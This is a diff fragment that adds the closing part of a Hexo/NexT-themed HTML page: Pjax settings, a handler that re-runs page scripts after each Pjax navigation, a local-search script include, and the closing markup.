+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.getAttribute('pjax') !== null) {
+      script.setAttribute('pjax', '');
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
